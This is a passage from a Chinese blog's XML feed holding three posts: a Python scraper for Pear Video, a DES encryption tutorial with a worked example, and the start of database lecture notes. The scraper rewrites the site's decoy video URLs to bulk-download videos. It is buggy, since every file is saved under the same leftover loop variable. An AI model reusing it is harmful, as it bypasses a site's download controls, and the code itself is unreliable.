        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>梨视频爬取项目代码</title>
      <link href="/posts/myh10022.html"/>
      <url>/posts/myh10022.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="路飞学城IT梨视频项目代码"><a href="#路飞学城IT梨视频项目代码" class="headerlink" title="路飞学城IT梨视频项目代码:"></a>路飞学城IT梨视频项目代码:</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree<span class="token keyword">from</span> multiprocessing<span class="token punctuation">.</span>dummy <span class="token keyword">import</span> Pool<span class="token keyword">import</span> os<span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">"pool/video"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">"pool/video"</span><span class="token punctuation">)</span>    <span class="token keyword">pass</span>url <span class="token operator">=</span> <span class="token string">"https://www.pearvideo.com/category_5"</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> yours<span class="token punctuation">,</span>   <span class="token comment">#自己的User-Agent</span>    <span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'www.pearvideo.com'</span><span class="token punctuation">,</span>    <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'https://www.pearvideo.com'</span><span class="token punctuation">}</span>page_text <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>texttree <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>page_text<span class="token punctuation">)</span><span class="token comment">#爬取当前页面的所有视频对应页面的url</span>video_list1 <span class="token operator">=</span> tree<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*[@class="listvideo-list clearfix"]/li/div/a/@href'</span><span class="token punctuation">)</span>video_list2 <span class="token operator">=</span> tree<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*[@class="category-list clearfix"]/li/div/a/@href'</span><span class="token punctuation">)</span>video_list <span class="token operator">=</span> video_list1 <span class="token operator">+</span> video_list2true_video_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> video_list<span class="token punctuation">:</span>    referer <span class="token operator">=</span> <span class="token string">"https://www.pearvideo.com/"</span> <span class="token operator">+</span> i    video_json_url <span class="token operator">=</span> <span class="token string">"https://www.pearvideo.com/videoStatus.jsp"</span>    <span class="token comment">#获取对应的ID号</span>    contentID <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token comment">#mrd就是随机生成的，可在js文件中看到</span>    mrd <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#需要添加的payload可在对应url中的payload中看见</span>    params <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'contId'</span> <span class="token punctuation">:</span> contentID<span class="token punctuation">,</span>   <span class="token comment">#key的Id中I一定是大写</span>        <span class="token string">'mrd'</span> <span class="token punctuation">:</span> mrd    <span class="token punctuation">}</span>    header <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> yours<span class="token punctuation">,</span>        <span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'www.pearvideo.com'</span><span class="token punctuation">,</span>        <span class="token string">'Referer'</span><span class="token punctuation">:</span> referer<span class="token punctuation">,</span>   <span class="token comment">#</span>        <span class="token string">'X-Requested-With'</span><span class="token punctuation">:</span> <span class="token string">'XMLHttpRequest'</span>    <span class="token punctuation">}</span>    video <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>video_json_url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">)</span>    video_json <span class="token operator">=</span> video<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#print(video.url)</span>    <span class="token comment">#print(video_json)</span>    video_url <span class="token operator">=</span> video_json<span class="token punctuation">[</span><span class="token string">"videoInfo"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'videos'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"srcUrl"</span><span class="token punctuation">]</span>  <span class="token comment">#得到的是假的视频地址</span>        <span class="token comment">#true_url = https://video.pearvideo.com/mp4/third/20220304/cont-1753457-11298265-184849-hd.mp4</span>    <span class="token comment">#false_url= https://video.pearvideo.com/mp4/third/20220304/1646538541581-11298265-184849-hd.mp4</span>        <span class="token comment">#生成真正的url，真正url可在开发者工具中的network标签下的media中看到</span>    ex <span class="token operator">=</span> <span class="token string">"https://video.pearvideo.com/mp4/.*?/.*?/(\d+)-.*?.mp4"</span>    true_video_url <span class="token operator">=</span> video_url<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>ex<span class="token punctuation">,</span>video_url<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'cont-'</span><span class="token operator">+</span>contentID<span class="token punctuation">)</span>    true_video_urls<span class="token punctuation">.</span>append<span class="token punctuation">(</span>true_video_url<span class="token punctuation">)</span>    <span class="token keyword">pass</span><span class="token comment"># print(true_video_urls)</span><span class="token keyword">def</span> <span class="token function">get_data</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"正在下载！"</span><span class="token punctuation">)</span>    header <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> yours    <span class="token punctuation">}</span>    video_data <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>content    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"pool/video/"</span><span class="token operator">+</span>i<span class="token operator">+</span><span class="token string">".mp4"</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>video_data<span class="token punctuation">)</span>        <span class="token keyword">pass</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"下载成功！"</span><span class="token punctuation">)</span>    <span class="token keyword">pass</span>pool <span class="token operator">=</span> Pool<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>pool<span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span>get_data<span class="token punctuation">,</span>true_video_urls<span class="token punctuation">)</span>pool<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pool<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有不懂的欢迎评论区提问<span class="github-emoji"><span>😃</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ！</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DES加密算法</title>
      <link href="/posts/myh10021.html"/>
      <url>/posts/myh10021.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="DES密码学详解"><a href="#DES密码学详解" class="headerlink" title="DES密码学详解"></a>DES密码学详解</h2><h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a><strong>1 前言</strong></h3><p>DES 算法是一种常见的分组加密算法，由IBM公司在1971年提出。DES 算法是分组加密算法的典型代表，同时也是应用最为广泛的对称加密算法。本文将详细讲述DES 的原理以及实现过程。</p><h4 id="1-1-明文"><a href="#1-1-明文" class="headerlink" title="1.1 明文"></a><strong>1.1 明文</strong></h4><p>明文是指没有经过加密的数据。一般而言，明文都是等待传输的数据。由于没有经过加密，明文很容易被识别与破解，因此在传输明文之前必须进行加密处理。</p><h4 id="1-2-密文"><a href="#1-2-密文" class="headerlink" title="1.2 密文"></a><strong>1.2 密文</strong></h4><p>密文只是明文经过某种加密算法而得到的数据，通常密文的形式复杂难以识别及理解。</p><h4 id="1-3-密钥"><a href="#1-3-密钥" class="headerlink" title="1.3 密钥"></a><strong>1.3 密钥</strong></h4><p>密钥是一种参数，它是在明文转换为密文或将密文转换为明文的算法中输入的参数。</p><h4 id="1-4-对称加密"><a href="#1-4-对称加密" class="headerlink" title="1.4 对称加密"></a><strong>1.4 对称加密</strong></h4><p>通信双方同时掌握一个密钥，加密解密都是由一个密钥完成的（即加密密钥等于解密密钥，加解密密钥可以相互推倒出来）。双方通信前共同拟定一个密钥，不对第三方公开。</p><h4 id="1-5-分组密码"><a href="#1-5-分组密码" class="headerlink" title="1.5 分组密码"></a><strong>1.5 分组密码</strong></h4><p>分组密码是将明文分成固定长度的组，每一组都采用同一密钥和算法进行加密，输出也是固定长度的密文。</p><h3 id="2-DES-加密算法"><a href="#2-DES-加密算法" class="headerlink" title="2 DES 加密算法"></a><strong>2 DES 加密算法</strong></h3><h4 id="2-1-分组长度"><a href="#2-1-分组长度" class="headerlink" title="2.1 分组长度"></a><strong>2.1 分组长度</strong></h4><p>DES 加密算法中，明文和密文为 64 位分组。密钥的长度为 64 位，但是密钥的每个第八位设置为奇偶校验位，因此密钥的实际长度为56位。</p><h4 id="2-2-加密流程"><a href="#2-2-加密流程" class="headerlink" title="2.2 加密流程"></a><strong>2.2 加密流程</strong></h4><p>DES 加密算法大致分为 4 个步骤： <strong>（1）初始置换</strong> <strong>（2）生成子密钥</strong> <strong>（3）迭代过程</strong> <strong>（4）逆置换</strong></p><p><strong>整个过程流程图：</strong>（应注意DES在最后一轮后，左半部分和右半部分并未交换,而是将R16与L16并在一起形成一个分组作为末置换的输入。）</p><img src="https://ctf-wiki.org/crypto/blockcipher/figure/des.gif" style="zoom:150%;"><h3 id="3-初始置换"><a href="#3-初始置换" class="headerlink" title="3 初始置换"></a><strong>3 初始置换</strong></h3><p>初始置换是将原始明文经过IP置换表处理。该过程并不会增加DES的安全性。置换过程如图：</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/cipher/202203041519207.png" style="zoom:150%;"><p>例如： 输入64位明文数据M（64位）：</p><p> <strong>明文M（64位）</strong>=  0110001101101111011011010111000001110101011101000110010101110010 </p><p>选取<strong>密钥K（64位）</strong>= 0001001100110100010101110111100110011011101111001101111111110001</p><p><strong>IP置换表：</strong></p><blockquote><p>58,50,42,34,26,18,10,02,<br>60,52,44,36,28,20,12,04,<br>62,54,46,38,30,22,14,06,<br>64,56,48,40,32,24,16,08,<br>57,49,41,33,25,17,09,01,<br>59,51,43,35,27,19,11,03,<br>61,53,45,37,29,21,13,05,<br>63,55,47,39,31,23,15,07,</p></blockquote><p>IP置换表中的数据指的是位置，例如58指将M第58位放置第1位。</p><p>M经过IP置换后为M’：</p><p><strong>M’（64位）</strong> =  1111111110111000011101100101011100000000111111110000011010000011 </p><p>取M’的前32位作为L0，则有 <strong>L0（32位）</strong>= 11111111101110000111011001010111 </p><p>取M’的后32位作为R0，则有 <strong>R0（32位）</strong>= 00000000111111110000011010000011</p><h3 id="4-生成子密钥"><a href="#4-生成子密钥" class="headerlink" title="4 生成子密钥"></a><strong>4 生成子密钥</strong></h3><p>DES 加密共执行16次迭代，每次迭代过程的数据长度为48位，因此需要16个48位的子密钥来进行加密，生成子密钥的过程如下：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/cipher/202203041519209.jpeg"></p><p>（1）第一轮置换：</p><p>密钥 K = 0001001100110100010101110111100110011011101111001101111111110001，需经过PC-1表置换，即执行置换选择1过程。 PC-1表为：</p><blockquote><p>57,49,41,33,25,17,09<br>01,58,50,42,34,26,18<br>10,02,59,51,43,35,27<br>19,11,03,60,52,44,36<br>63,55,47,39,31,23,15<br>07,62,54,46,38,30,22<br>14,06,61,53,45,37,29<br>21,13,05,28,20,12,04</p></blockquote><p>PC-1表为8行7列的表，密钥K经PC-1后变为56位数据K’。</p><p><strong>K’（56位）</strong>= 11110000110011001010101011110101010101100110011110001111  </p><p>取K’的前28位作为C0，则有 <strong>C0（28位）</strong>= 1111000011001100101010101111 </p><p>取K’的后28位作为D0，则有 <strong>D0（28位）</strong>= 0101010101100110011110001111 </p><p>获得C0，D0后进行左移操作需要查询移动位数表。</p><p>每轮移动移动位数表如下：</p><blockquote><p>轮数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 </p><p>位数 1 1 2 2 2 2 2 2 1  2   2   2   2  2   2   1</p></blockquote><p>进行第一轮移位，轮数为1，查表得左移位数为1。</p><p>C0左移1位为C1： <strong>C1（28位）</strong> = 1110000110011001010101011111 </p><p>D0左移1位为D1： <strong>D1（28位）</strong> = 1010101011001100111100011110 </p><p>将C1和D1合并后，经过PC-2表置换得到子密钥K1，PC-2表中去除了第9，18，22，25，35，38，43，54位。</p><p>PPC-2表为6X8的表，PC-2表如下：</p><blockquote><p>14,17,11,24,01,05,<br>03,28,15,06,21,10,<br>23,19,12,04,26,08,<br>16,07,27,20,13,02,<br>41,52,31,37,47,55,<br>30,40,51,45,33,48,<br>44,49,39,56,34,53,<br>46,42,50,36,29,32</p></blockquote><p>由于PC-2表为6X8的表，经PC-2置换后的数据为48位，置换后得到密钥K1， <strong>K1（48位）</strong>= 000110110000001011101111111111000111000001110010</p><p>（2）第二轮置换</p><p>C1和D1再次左移，轮数 = 2，查表得左移位数 = 1，则C1和D1左移1位得到C2和D2。</p><p><strong>C2（28位）</strong>= 1100001100110010101010111111 </p><p><strong>D2（28位）</strong>= 0101010110011001111000111101 </p><p>C2和D2合并后为56位，经过PC-2表置换得到密钥K2（48位） </p><p><strong>K2（48位）</strong>= 011110011010111011011001110110111100100111100101 </p><p>依次类推，得到K3-K16子密钥，注意Ci和Di左移的位数。</p><blockquote><p>C3（28位） = 0000110011001010101011111111<br>D3（28位） = 0101011001100111100011110101<br>K3（48位） = 010101011111110010001010010000101100111110011001</p></blockquote><blockquote><p>C4（28位） = 0011001100101010101111111100<br>D4（28位） = 0101100110011110001111010101<br>K4（48位） = 011100101010110111010110110110110011010100011101</p></blockquote><blockquote><p>C5（28位） = 1100110010101010111111110000<br>D5（28位） = 0110011001111000111101010101<br>K5（48位） = 011111001110110000000111111010110101001110101000</p></blockquote><blockquote><p>C6（28位） = 0011001010101011111111000011<br>D6（28位） = 1001100111100011110101010101<br>K6（48位） = 011000111010010100111110010100000111101100101111</p></blockquote><blockquote><p>C7（28位） = 1100101010101111111100001100<br>D7（28位） = 0110011110001111010101010110<br>K7（48位） = 111011001000010010110111111101100001100010111100</p></blockquote><blockquote><p>C8（28位） = 0010101010111111110000110011<br>D8（28位） = 1001111000111101010101011001<br>K8（48位） = 111101111000101000111010110000010011101111111011</p></blockquote><blockquote><p>C9（28位） = 0101010101111111100001100110<br>D9（28位） = 0011110001111010101010110011<br>K9（48位） = 111000001101101111101011111011011110011110000001</p></blockquote><blockquote><p>C10（28位） = 0101010111111110000110011001<br>D10（28位） = 1111000111101010101011001100<br>K10（48位） = 101100011111001101000111101110100100011001001111</p></blockquote><blockquote><p>C11（28位） = 0101011111111000011001100101<br>D11（28位） = 1100011110101010101100110011<br>K11（48位） = 001000010101111111010011110111101101001110000110</p></blockquote><blockquote><p>C12（28位） = 0101111111100001100110010101<br>D12（28位） = 0001111010101010110011001111<br>K12（48位） = 011101010111000111110101100101000110011111101001</p></blockquote><blockquote><p>C13（28位） = 0111111110000110011001010101<br>D13（28位） = 0111101010101011001100111100<br>K13（48位） = 100101111100010111010001111110101011101001000001</p></blockquote><blockquote><p>C14（28位） = 1111111000011001100101010101<br>D14（28位） = 1110101010101100110011110001<br>K14（48位） = 010111110100001110110111111100101110011100111010</p></blockquote><blockquote><p>C15（28位） = 1111100001100110010101010111<br>D15（28位） = 1010101010110011001111000111<br>K15（48位） = 101111111001000110001101001111010011111100001010</p></blockquote><blockquote><p>C16（28位） = 1111000011001100101010101111<br>D16（28位） = 0101010101100110011110001111<br>K16（48位） = 110010110011110110001011000011100001011111110101</p></blockquote><h3 id="5-迭代过程"><a href="#5-迭代过程" class="headerlink" title="5 迭代过程"></a><strong>5 迭代过程</strong></h3><p>设Li（32位）和Ri（32位）为第i次迭代结果的左半部分与右半部分，子密钥Ki为第i轮的48位加密密钥。定义运算规则：</p><p><strong>Li = Ri-1;</strong> </p><p><strong>Ri = Li ⊕ f(Ri-1, Ki);</strong></p><p>整个迭代过程如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/cipher/202203041519210.png"></p><h4 id="5-1-扩展置换E"><a href="#5-1-扩展置换E" class="headerlink" title="5.1 扩展置换E"></a><strong>5.1 扩展置换E</strong></h4><p>右半部分Ri的位数为32位，而密钥长度Ki为48位，为了能够保证Ri与Ki可以进行异或运算需要对Ri位数进行扩展，主要目的是在加密数据的过程中制造一些<strong>雪崩效应</strong>，使用数据块中的1位将在下一步操作中影响更多位，从而产生<strong>扩散效果</strong>。用于扩展置换表E如下：</p><p>扩展置换表E：</p><blockquote><p>32,01,02,03,04,05,<br>04,05,06,07,08,09,<br>08,09,10,11,12,13,<br>12,13,14,15,16,17,<br>16,17,18,19,20,21,<br>20,21,22,23,24,25,<br>24,25,26,27,28,29,<br>28,29,30,31,32,01</p></blockquote><p>例如： <strong>L0（32位）</strong> = 11111111101110000111011001010111 </p><p><strong>R0（32位）</strong> = 00000000111111110000011010000011 </p><p>R0（32位）经过扩展置换后变为48位数据： </p><p><strong>E(R0)（48位）</strong> = 100000000001011111111110100000001101010000000110</p><p>将E(R0)（48位）与K1（48位）作异或运算：</p><pre class="line-numbers language-none"><code class="language-none">  100000000001011111111110100000001101010000000110  ⊕ 000110110000001011101111111111000111000001110010 = 100110110001010100010001011111001010010001110100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到： <strong>E(R0)^K1（48位）</strong> = 100110110001010100010001011111001010010001110100</p><h4 id="5-2-S-盒替代"><a href="#5-2-S-盒替代" class="headerlink" title="5.2 S-盒替代"></a><strong>5.2 S-盒替代</strong></h4><p>代替运算由8个不同的代替盒（S盒）完成。每个S盒有6位输入，4位输出。代替运算流程如下：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/cipher/202203041519211.png" alt="代替运算流程"></p><p>S-盒1：</p><blockquote><p>14,04,13,01,02,15,11,08,03,10,06,12,05,09,00,07, 00,15,07,04,14,02,13,01,10,06,12,11,09,05,03,08, 04,01,14,08,13,06,02,11,15,12,09,07,03,10,05,00, 15,12,08,02,04,09,01,07,05,11,03,14,10,00,06,13,</p></blockquote><p>S-盒2：</p><blockquote><p>15,01,08,14,06,11,03,04,09,07,02,13,12,00,05,10, 03,13,04,07,15,02,08,14,12,00,01,10,06,09,11,05, 00,14,07,11,10,04,13,01,05,08,12,06,09,03,02,15, 13,08,10,01,03,15,04,02,11,06,07,12,00,05,14,09,</p></blockquote><p>S-盒3：</p><blockquote><p>10,00,09,14,06,03,15,05,01,13,12,07,11,04,02,08, 13,07,00,09,03,04,06,10,02,08,05,14,12,11,15,01, 13,06,04,09,08,15,03,00,11,01,02,12,05,10,14,07, 01,10,13,00,06,09,08,07,04,15,14,03,11,05,02,12,</p></blockquote><p>S-盒4：</p><blockquote><p>07,13,14,03,00,06,09,10,01,02,08,05,11,12,04,15, 13,08,11,05,06,15,00,03,04,07,02,12,01,10,14,09, 10,06,09,00,12,11,07,13,15,01,03,14,05,02,08,04, 03,15,00,06,10,01,13,08,09,04,05,11,12,07,02,14,</p></blockquote><p>S-盒5：</p><blockquote><p>02,12,04,01,07,10,11,06,08,05,03,15,13,00,14,09, 14,11,02,12,04,07,13,01,05,00,15,10,03,09,08,06, 04,02,01,11,10,13,07,08,15,09,12,05,06,03,00,14, 11,08,12,07,01,14,02,13,06,15,00,09,10,04,05,03,</p></blockquote><p>S-盒6：</p><blockquote><p>12,01,10,15,09,02,06,08,00,13,03,04,14,07,05,11, 10,15,04,02,07,12,09,05,06,01,13,14,00,11,03,08, 09,14,15,05,02,08,12,03,07,00,04,10,01,13,11,06, 04,03,02,12,09,05,15,10,11,14,01,07,06,00,08,13,</p></blockquote><p>S-盒7：</p><blockquote><p>04,11,02,14,15,00,08,13,03,12,09,07,05,10,06,01, 13,00,11,07,04,09,01,10,14,03,05,12,02,15,08,06, 01,04,11,13,12,03,07,14,10,15,06,08,00,05,09,02, 06,11,13,08,01,04,10,07,09,05,00,15,14,02,03,12,</p></blockquote><p>S-盒8：</p><blockquote><p>13,02,08,04,06,15,11,01,10,09,03,14,05,00,12,07, 01,15,13,08,10,03,07,04,12,05,06,11,00,14,09,02, 07,11,04,01,09,12,14,02,00,06,10,13,15,03,05,08, 02,01,14,07,04,10,08,13,15,12,09,00,03,05,06,11,</p></blockquote><p><strong>S盒的计算规则：</strong> 例如：若S-盒1的输入为110111，第一位与最后一位构成11，十进制值为3，则对应第3行，中间4位为1011对应的十进制值为11，则对应第11列。查找S-盒1表的值为14，则S-盒1的输出为1110。8个S盒将输入的48位数据输出为32位数据。</p><p>按照S-盒的计算过程，将 <strong>E(R0)^K1（48位）</strong>= 100110110001010100010001011111001010010001110100，通过 S- 盒替换得到的S盒输出为10001011110001000110001011101010（32位）。</p><h4 id="5-3-P-盒置换"><a href="#5-3-P-盒置换" class="headerlink" title="5.3 P-盒置换"></a><strong>5.3 P-盒置换</strong></h4><p>将S-盒替代的输出结果作为P-盒置换的输入。P-盒置换表如下：</p><blockquote><p>16,07,20,21,29,12,28,17,01,15,23,26,05,18,31,10, </p><p>02,08,24,14,32,27,03,09,19,13,30,06,22,11,04,25,</p></blockquote><p>将S盒输出10001011110001000110001011101010（32位）经过P盒置换，P-盒置换输出01001000101111110101010110000001</p><p>令<strong>扩展置换E、S-盒替代、P盒置换</strong>的过程作为函数f。</p><p>第一次迭代过程f(R0,K1)为： <strong>f(R0,K1)</strong> = 01001000101111110101010110000001</p><p>计算<strong>L1（32位）</strong>= R0 = 00000000111111110000011010000011 </p><p>计算<strong>R1（32位）</strong>= L0 ^ f(R0,K1)   </p><pre class="line-numbers language-none"><code class="language-none">  11111111101110000111011001010111  ⊕ 01001000101111110101010110000001 = 10110111000001110010001111010110<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>R1（32位）</strong> = 10110111000001110010001111010110。</p><p> 将L1与R1作为输入，继续执行迭代过程f。直至输出L16与R16。经过16次迭代后输出:</p><p><strong>L16（32位）</strong>= 00110000100001001101101100101000 </p><p><strong>R16（32位）</strong>= 10110001011001010011000000011000</p><h3 id="6-逆置换"><a href="#6-逆置换" class="headerlink" title="6 逆置换"></a><strong>6 逆置换</strong></h3><p>将初始置换进行16次的迭代，即进行16层的加密变换，得到L16和R16，将此作为输入块，进行逆置换得到最终的密文输出块。逆置换是初始置换的逆运算。从初始置换规则中可以看到，原始数据的第1位置换到了第40位，第2位置换到了第8位。则逆置换就是将第40位置换到第1位，第8位置换到第2位。以此类推，逆置换规则表如下：</p><blockquote><p>40,08,48,16,56,24,64,32,<br>39,07,47,15,55,23,63,31,<br>38,06,46,14,54,22,62,30,<br>37,05,45,13,53,21,61,29,<br>36,04,44,12,52,20,60,28,<br>35,03,43,11,51,19,59,27,<br>34,02,42,10,50,18,58 26,<br>33,01,41,09,49,17,57,25,</p></blockquote><p>逆置换过程图：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/cipher/202203041519212.png" alt="逆置换过程"></p><p>将L16与R16构成64位数据，经过逆置换表输出密文为：</p><p><strong>密文：</strong>0101100000001000001100000000101111001101110101100001100001101000</p><h3 id="7-结语"><a href="#7-结语" class="headerlink" title="7 结语"></a><strong>7 结语</strong></h3><p>DES 加密算法为最为常见的分组加密算法。其主要思想在于数据位的置换与移位过程，通过16次的迭代加密与最终的逆置换得出最终的密文。DES 的解密方式只需按照加密的逆过程求解即可。由于DES 加密过程的算法是公开的，所以密钥K的保密就显得尤为重要，只有发送方与接收方采用相同的密钥进行加密解密才能获取明文数据。</p><p>文章参考于：<a href="https://cloud.tencent.com/developer/article/1497864">https://cloud.tencent.com/developer/article/1497864</a></p><p>​                      <a href="https://www.cnblogs.com/idreamo/p/9333753.html%EF%BC%88%E6%9C%89%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0%EF%BC%89">https://www.cnblogs.com/idreamo/p/9333753.html（有算法实现）</a></p><hr><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/cipher/202203041519213.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库：第一章</title>
      <link href="/posts/myh10020.html"/>
      <url>/posts/myh10020.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第一章：数据库系统基础"><a href="#第一章：数据库系统基础" class="headerlink" title="第一章：数据库系统基础"></a>第一章：数据库系统基础</h2><h3 id="1-1-数据库及其系统的概念"><a href="#1-1-数据库及其系统的概念" class="headerlink" title="1.1 数据库及其系统的概念"></a>1.1 数据库及其系统的概念</h3><h4 id="1-1-1-数据库的定义"><a href="#1-1-1-数据库的定义" class="headerlink" title="1.1.1 数据库的定义"></a>1.1.1 数据库的定义</h4><p>数据库是⼀种依照特定<font color="#FF5E3A" size="3">数据模型</font>组织、存储和管理数据的<font color="#FF5E3A" size="3">⽂件集合</font>。在信息系统中，数据库的基本作⽤是组织与存储系统数据，并为系统软件从中存取数据提供⽀持。</p><p>与⽂件系统中普通数据⽂件有明显不同，数据库⽂件具有如下特点：</p><ul><li>数据⼀般不重复存放。</li><li>可⽀持多个应⽤程序并发访问。</li><li>数据结构独⽴于使⽤它的应⽤程序。</li><li>对数据增、删、改、查操作均由<font color="#FF5E3A" size="3">数据库系统软件</font>进⾏管理和控制。</li></ul><h4 id="1-1-2-数据模型"><a href="#1-1-2-数据模型" class="headerlink" title="1.1.2 数据模型"></a>1.1.2 数据模型</h4><p>数据模型是⼀种<font color="#FF5E3A" size="3">描述事物对象数据特征及其结构的形式化表⽰</font>， 通常由数据结构、数据操作、数据约束3个部分组成。</p><ul><li>数据结构⽤于描述事物对象的<font color="#FF5E3A" size="3">静态特征</font>，其中包括事物对象 的属性数据、数据类型、数据组织⽅式等。</li><li>数据操作⽤于描述事物对象的<font color="#FF5E3A" size="3">动态特征</font>，即对事物对象的属性数据可进⾏的数据操作，如插⼊、更新、删除和查询等。</li><li>数据约束⽤于描述事物对象的数据之间语义的联系，以及数 据取值范围等规则，从⽽确保数据的完整性、⼀致性和有效性。</li></ul><p>传统数据库先后使⽤的数据模型主要有层次数据模型、⽹状数据 模型、关系数据模型。<font color="#FF5E3A" size="3">它们之间的 根本区别在于数据之间的联系⽅式不同，即数据记录之间的联系⽅式 不同</font>。</p><ul><li>层次数据模型每个数据结点存储⼀个数据记录， 数据结点之间通过链接指针进⾏联系。</li><li>⽹状数据模型结点之间的联系也使⽤链接指针 来实现，但⽹状数据模型可以表⽰数据结点之间的多个从属关系，同 时也可以表⽰数据结点之间的横向关系。</li><li>在关系数据模型中，<font color="#FF5E3A" size="3">多个⼆维表可通过相同属性列的⼀致性约束进⾏数据关联</font>。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/db/202202231127809.png"></p><h4 id="1-1-3-数据库系统的组成"><a href="#1-1-3-数据库系统的组成" class="headerlink" title="1.1.3 